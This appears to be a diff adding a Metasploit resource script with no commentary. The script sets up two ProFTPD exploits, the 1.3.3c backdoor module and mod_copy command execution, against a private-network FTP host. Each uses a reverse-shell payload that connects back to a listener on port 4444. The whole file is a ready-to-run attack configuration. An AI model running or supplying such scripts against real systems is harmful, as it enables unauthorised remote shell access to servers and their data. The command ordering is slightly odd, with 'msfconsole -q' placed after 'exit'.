@@ -1,1 +1,29 @@
 
+use exploits/unix/ftp/proftpd_133c_backdoor.rb
+
+set RHOSTS 192.168.0.162
+set RPORT 21
+set RPORT_FTP 21
+set SITEPATH /var/www
+set TARGETURI /
+set TMPPATH /tmp
+set LHOST 192.168.0.208
+set LPORT 4444
+set payload payload/cmd/unix/reverse
+run
+exit
+msfconsole -q
+use exploits/unix/ftp/proftpd_modcopy_exec.rb
+
+set RHOSTS 192.168.0.162
+set RPORT 21
+set RPORT_FTP 21
+set SITEPATH /var/www
+set TARGETURI /
+set TMPPATH /tmp
+set LHOST 192.168.0.208
+set LPORT 4444
+set payload payload/cmd/unix/reverse
+run
+exit
+msfconsole -q
